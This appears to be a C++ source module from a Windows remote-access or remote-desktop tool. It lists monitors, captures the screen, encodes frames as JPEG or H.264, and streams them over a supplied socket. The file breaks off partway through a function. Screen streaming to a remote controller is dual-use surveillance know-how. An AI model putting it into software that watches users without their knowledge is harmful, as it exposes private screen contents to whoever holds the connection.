#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

// Media Foundation Headers
#include <mfapi.h>
#include <mfidl.h>
#include <mftransform.h>
#include <mferror.h>

#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfuuid.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static int g_captureFormat = 2; // Default 2 (H.264), can be 1 (JPEG)
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

// GDI+ Globals
static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Encoder State
static mutex g_encoderMutex;
static IMFTransform* g_pEncoder = nullptr;
static bool g_encoderInitialized = false;
static int g_lastWidth = 0;
static int g_lastHeight = 0;
static int g_lastFormat = 0;
static LONGLONG g_frameCount = 0;

static const GUID CLSID_CMSH264EncoderMFT = { 0x6ca50344, 0x051a, 0x4ded, { 0x97, 0x79, 0xa4, 0x33, 0x05, 0x16, 0x5e, 0x35 } };

// Manually define missing ICodecAPI and related GUIDs for complete MinGW support
#ifndef __ICodecAPI_INTERFACE_DEFINED__
#define __ICodecAPI_INTERFACE_DEFINED__
struct ICodecAPI : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE IsSupported(const GUID* Api, BOOL* pSupported) = 0;
    virtual HRESULT STDMETHODCALLTYPE IsReadOnly(const GUID* Api, BOOL* pReadOnly) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetParameterRange(const GUID* Api, VARIANT* pMin, VARIANT* pMax, VARIANT* pStep) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetParameterValues(const GUID* Api, VARIANT** ppValues, ULONG* pCount) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetDefaultValue(const GUID* Api, VARIANT* pValue) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetValue(const GUID* Api, VARIANT* pValue) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetValue(const GUID* Api, VARIANT* pValue) = 0;
    virtual HRESULT STDMETHODCALLTYPE RegisterForEvent(const GUID* Api, LONG_PTR userData) = 0;
    virtual HRESULT STDMETHODCALLTYPE UnregisterForEvent(const GUID* Api) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetAllDefaults(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetValueWithCosmetics(const GUID* Api, VARIANT* pValue) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetValueWithCosmetics(const GUID* Api, VARIANT* pValue) = 0;
};
#endif

static const GUID IID_ICodecAPI_Local = { 0x901db743, 0xf8e2, 0x44c4, { 0xac, 0x1a, 0x85, 0x2c, 0xd2, 0x11, 0xb8, 0x5a } };
static const GUID CODECAPI_AVEncMPVGOPSize = { 0x951a7a7e, 0xdcee, 0x4630, { 0xb2, 0xc4, 0x98, 0xf1, 0xb1, 0x37, 0x04, 0x16 } };

#ifndef MFT_ENUM_FLAG_SYNCHRONOUSMFT
#define MFT_ENUM_FLAG_SYNCHRONOUSMFT MFT_ENUM_FLAG_SYNCMFT
#endif
#ifndef MFT_ENUM_FLAG_ASYNCHRONOUSMFT
#define MFT_ENUM_FLAG_ASYNCHRONOUSMFT MFT_ENUM_FLAG_ASYNCMFT
#endif

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    const vector<unsigned char>& frameBytes,
                                    int format) {
    if (frameBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = (uint32_t)format; // 1 = JPEG, 2 = H.264
    frameHeader.dataSize = (uint32_t)frameBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + frameBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], frameBytes.data(), frameBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static bool capture_monitor_frame_jpeg(const RECT& rect,
                                       int scalePercent,
                                       vector<unsigned char>& jpegBytes,
                                       int& outputWidth,
                                       int& outputHeight,
                                       string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);
    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return false;
    }

    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
    DeleteObject(bitmap);
    return encoded;
}

// BGRX to NV12 Color Format Conversion (ITU-R BT.601 formula)
static void BGRX_to_NV12(const uint8_t* bgrx, int width, int height, uint8_t* nv12) {
    uint8_t* yPlane = nv12;
    uint8_t* uvPlane = nv12 + (width * height);

    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int bgrxIdx = (y * width + x) * 4;
            uint8_t b = bgrx[bgrxIdx];
            uint8_t g = bgrx[bgrxIdx + 1];
            uint8_t r = bgrx[bgrxIdx + 2];

            int Y = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
            yPlane[y * width + x] = (uint8_t)clamp_int(Y, 0, 255);

            if ((y % 2 == 0) && (x % 2 == 0)) {
                int sumR = r, sumG = g, sumB = b;
                int count = 1;

                if (x + 1 < width) {
                    sumB += bgrx[bgrxIdx + 4];
                    sumG += bgrx[bgrxIdx + 5];
                    sumR += bgrx[bgrxIdx + 6];
                    count++;
                }
                if (y + 1 < height) {
                    int bgrxIdx_next = ((y + 1) * width + x) * 4;
                    sumB += bgrx[bgrxIdx_next];
                    sumG += bgrx[bgrxIdx_next + 1];
                    sumR += bgrx[bgrxIdx_next + 2];
                    count++;
                    if (x + 1 < width) {
                        sumB += bgrx[bgrxIdx_next + 4];
                        sumG += bgrx[bgrxIdx_next + 5];
                        sumR += bgrx[bgrxIdx_next + 6];
                        count++;
                    }
                }

                r = sumR / count;
                g = sumG / count;
                b = sumB / count;

                int U = ((-38 * r - 74 * g + 112 * b + 128) >> 8) + 128;
                int V = ((112 * r - 94 * g - 18 * b + 128) >> 8) + 128;

                int uvIdx = (y / 2) * (width) + x;
                uvPlane[uvIdx] = (uint8_t)clamp_int(U, 0, 255);
                uvPlane[uvIdx + 1] = (uint8_t)clamp_int(V, 0, 255);
            }
        }
    }
}

// Media Foundation activation / Direct CoCreateInstance lookup
static HRESULT FindEncoderMFT(IMFTransform** ppEncoder) {
    *ppEncoder = nullptr;
    MFT_REGISTER_TYPE_INFO inputInfo = { MFMediaType_Video, MFVideoFormat_NV12 };
    MFT_REGISTER_TYPE_INFO outputInfo = { MFMediaType_Video, MFVideoFormat_H264 };

    UINT32 flags = MFT_ENUM_FLAG_SYNCHRONOUSMFT | MFT_ENUM_FLAG_ASYNCHRONOUSMFT | MFT_ENUM_FLAG_HARDWARE | MFT_ENUM_FLAG_SORTANDFILTER;
    IMFActivate** ppActivate = nullptr;
    UINT32 count = 0;

    HRESULT hr = MFTEnumEx(MFT_CATEGORY_VIDEO_ENCODER, flags, &inputInfo, &outputInfo, &ppActivate, &count);
    if (SUCCEEDED(hr) && count > 0) {
        hr = ppActivate[0]->ActivateObject(IID_IMFTransform, (void**)ppEncoder);
        for (UINT32 i = 0; i < count; i++) {
            ppActivate[i]->Release();
        }
        CoTaskMemFree(ppActivate);
        if (SUCCEEDED(hr)) {
            return S_OK;
        }
    }

    return CoCreateInstance(CLSID_CMSH264EncoderMFT, NULL, CLSCTX_INPROC_SERVER, IID_IMFTransform, (void**)ppEncoder);
}

static HRESULT ConfigureEncoder(IMFTransform* pEncoder, int width, int height, int fps) {
    IMFMediaType* pOutputType = nullptr;
    HRESULT hr = MFCreateMediaType(&pOutputType);
    if (FAILED(hr)) return hr;

    pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pOutputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_H264);
    pOutputType->SetUINT32(MF_MT_AVG_BITRATE, width * height * 2);
    MFSetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, width, height);
    MFSetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, fps, 1);
    pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
    MFSetAttributeRatio(pOutputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);

    hr = pEncoder->SetOutputType(0, pOutputType, 0);
    pOutputType->Release();
    if (FAILED(hr)) return hr;

    IMFMediaType* pInputType = nullptr;
    hr = MFCreateMediaType(&pInputType);
    if (FAILED(hr)) return hr;

    pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pInputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
    MFSetAttributeSize(pInputType, MF_MT_FRAME_SIZE, width, height);
    MFSetAttributeRatio(pInputType, MF_MT_FRAME_RATE, fps, 1);
    pInputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
    MFSetAttributeRatio(pInputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);

    hr = pEncoder->SetInputType(0, pInputType, 0);
    pInputType->Release();
    if (FAILED(hr)) return hr;

    ICodecAPI* pCodec = nullptr;
    hr = pEncoder->QueryInterface(IID_ICodecAPI_Local, (void**)&pCodec);
    if (SUCCEEDED(hr)) {
        VARIANT var;
        VariantInit(&var);
        var.vt = VT_UI4;
        var.ulVal = 30; // GOP size = 30
        pCodec->SetValue(&CODECAPI_AVEncMPVGOPSize, &var);
        pCodec->Release();
    }

    return S_OK;
}

static HRESULT CreateInputSample(const uint8_t* nv12Data, int width, int height, LONGLONG timestamp, LONGLONG duration, IMFSample** ppSample) {
    *ppSample = nullptr;
    IMFMediaBuffer* pBuffer = nullptr;
    HRESULT hr = MFCreateMemoryBuffer(width * height * 3 / 2, &pBuffer);
    if (FAILED(hr)) return hr;

    BYTE* pData = nullptr;
    DWORD maxLen = 0, currentLen = 0;
    hr = pBuffer->Lock(&pData, &maxLen, &currentLen);
    if (SUCCEEDED(hr)) {
        memcpy(pData, nv12Data, width * height * 3 / 2);
        pBuffer->Unlock();
        pBuffer->SetCurrentLength(width * height * 3 / 2);
    } else {
        pBuffer->Release();
        return hr;
    }

    IMFSample* pSample = nullptr;
    hr = MFCreateSample(&pSample);
    if (SUCCEEDED(hr)) {
        pSample->AddBuffer(pBuffer);
        pSample->SetSampleTime(timestamp);
        pSample->SetSampleDuration(duration);
        *ppSample = pSample;
    }
    pBuffer->Release();
    return hr;
}

static HRESULT CreateOutputSample(DWORD size, IMFSample** ppSample) {
    *ppSample = nullptr;
    IMFMediaBuffer* pBuffer = nullptr;
    HRESULT hr = MFCreateMemoryBuffer(size, &pBuffer);
    if (FAILED(hr)) return hr;

    IMFSample* pSample = nullptr;
    hr = MFCreateSample(&pSample);
    if (SUCCEEDED(hr)) {
        pSample->AddBuffer(pBuffer);
        *ppSample = pSample;
    }
    pBuffer->Release();
    return hr;
}

static void CleanupEncoder() {
    lock_guard<mutex> lock(g_encoderMutex);
    if (g_pEncoder) {
        g_pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_END_OF_STREAM, 0);
        g_pEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);
        g_pEncoder->Release();
        g_pEncoder = nullptr;
    }
    g_encoderInitialized = false;
    g_lastWidth = 0;
    g_lastHeight = 0;
    g_frameCount = 0;
}

static bool encode_h264_frame(const RECT& rect,
                              int scalePercent,
                              int fps,
                              vector<unsigned char>& encodedBytes,
                              int& outputWidth,
                              int& outputHeight,
                              string& error) {
    encodedBytes.clear();

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    // Min resolution 128x128 and alignment to even boundaries to prevent MF_E_INVALIDMEDIATYPE
    outputWidth = max(128, (sourceWidth * scalePercent) / 100);
    outputHeight = max(128, (sourceHeight * scalePercent) / 100);
    outputWidth = (outputWidth >> 1) << 1;
    outputHeight = (outputHeight >> 1) << 1;

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);

    if (!copied) {
        DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Screen capture failed";
        return false;
    }

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = outputWidth;
    bmi.bmiHeader.biHeight = -outputHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    vector<uint8_t> bgrxPixels(outputWidth * outputHeight * 4);
    if (!GetDIBits(screenDC, bitmap, 0, outputHeight, bgrxPixels.data(), &bmi, DIB_RGB_COLORS)) {
        DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "GetDIBits failed";
        return false;
    }

    DeleteObject(bitmap);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    vector<uint8_t> nv12Pixels(outputWidth * outputHeight * 3 / 2);
    BGRX_to_NV12(bgrxPixels.data(), outputWidth, outputHeight, nv12Pixels.data());

    // Video encoder setups are serialized for thread-safety and stability
    lock_guard<mutex> lock(g_encoderMutex);

    if (!g_encoderInitialized || g_lastWidth != outputWidth || g_lastHeight != outputHeight) {
        if (g_pEncoder) {
            g_pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_END_OF_STREAM, 0);
            g_pEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);
            g_pEncoder->Release();
            g_pEncoder = nullptr;
        }
        g_encoderInitialized = false;

        HRESULT hr = FindEncoderMFT(&g_pEncoder);
        if (FAILED(hr)) {
            error = "H.264 Encoder MFT could not be created";
            return false;
        }

        hr = ConfigureEncoder(g_pEncoder, outputWidth, outputHeight, fps);
        if (FAILED(hr)) {
            g_pEncoder->Release();
            g_pEncoder = nullptr;
            error = "Encoder configuration failed";
            return false;
        }

        g_pEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_FLUSH, 0);
        g_pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
        g_pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);

        g_lastWidth = outputWidth;
        g_lastHeight = outputHeight;
        g_frameCount = 0;
        g_encoderInitialized = true;
    }

    LONGLONG duration = 10000000 / fps;
    LONGLONG timestamp = g_frameCount * duration;
    g_frameCount++;

    IMFSample* pSample = nullptr;
    HRESULT hr = CreateInputSample(nv12Pixels.data(), outputWidth, outputHeight, timestamp, duration, &pSample);
    if (FAILED(hr)) {
        error = "Failed to create input sample";
        return false;
    }

    hr = g_pEncoder->ProcessInput(0, pSample, 0);
    pSample->Release();
    if (FAILED(hr)) {
        error = "Encoder ProcessInput failed";
        return false;
    }

    MFT_OUTPUT_STREAM_INFO streamInfo{};
    g_pEncoder->GetOutputStreamInfo(0, &streamInfo);
    DWORD outputSize = streamInfo.cbSize;
    if (outputSize == 0) {
        outputSize = outputWidth * outputHeight;
    }

    while (true) {
        MFT_OUTPUT_DATA_BUFFER outputBuffer{};
        outputBuffer.dwStreamID = 0;
        outputBuffer.pSample = nullptr;
        outputBuffer.dwStatus = 0;
        outputBuffer.pEvents = nullptr;

        if (!(streamInfo.dwFlags & (MFT_OUTPUT_STREAM_PROVIDES_SAMPLES | MFT_OUTPUT_STREAM_CAN_PROVIDE_SAMPLES))) {
            HRESULT hrAlloc = CreateOutputSample(outputSize, &outputBuffer.pSample);
            if (FAILED(hrAlloc)) break;
        }

        DWORD status = 0;
        HRESULT hrOutput = g_pEncoder->ProcessOutput(0, 1, &outputBuffer, &status);
        if (hrOutput == MF_E_TRANSFORM_NEED_MORE_INPUT) {
            if (outputBuffer.pSample) outputBuffer.pSample->Release();
            break;
        }
        if (FAILED(hrOutput)) {
            if (outputBuffer.pSample) outputBuffer.pSample->Release();
            break;
        }

        if (outputBuffer.pSample) {
            IMFMediaBuffer* pOutBuffer = nullptr;
            if (SUCCEEDED(outputBuffer.pSample->GetBufferByIndex(0, &pOutBuffer))) {
                BYTE* pData = nullptr;
                DWORD currentLen = 0;
                if (SUCCEEDED(pOutBuffer->Lock(&pData, nullptr, &currentLen))) {
                    encodedBytes.insert(encodedBytes.end(), pData, pData + currentLen);
                    pOutBuffer->Unlock();
                }
                pOutBuffer->Release();
            }
            outputBuffer.pSample->Release();
        }
        if (outputBuffer.pEvents) outputBuffer.pEvents->Release();
    }

    return true;
}

static void capture_loop() {
    CoInitialize(NULL);
    ensure_gdiplus();
    MFStartup(MF_VERSION, 0); // standard MFStartup using 0
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        int format = 2; // Default 2 (H.264)
        RECT captureRect{};
        bool hasCaptureRect = false;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            format = g_captureFormat;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        if (format == 1) {
            // Compress to JPEG using our GDI+ logic
            if (capture_monitor_frame_jpeg(captureRect, scale, frameBytes, width, height, error)) {
                if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, frameBytes, 1)) {
                    g_captureRunning.store(false);
                    break;
                }
            } else {
                send_monitor_error(sock, error.empty() ? "Capture failed" : error);
                g_captureRunning.store(false);
                break;
            }
        } else {
            // Compress to H.264
            if (encode_h264_frame(captureRect, scale, targetFps, frameBytes, width, height, error)) {
                // Do not fail if output is empty due to need-more-input on start, just proceed to sleep
                if (!frameBytes.empty()) {
                    if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, frameBytes, 2)) {
                        g_captureRunning.store(false);
                        break;
                    }
                }
            } else {
                send_monitor_error(sock, error.empty() ? "Capture failed" : error);
                g_captureRunning.store(false);
                break;
            }
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }

    CleanupEncoder();
    shutdown_gdiplus();
    MFShutdown();
    CoUninitialize();
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    CleanupEncoder();

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps, int format) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
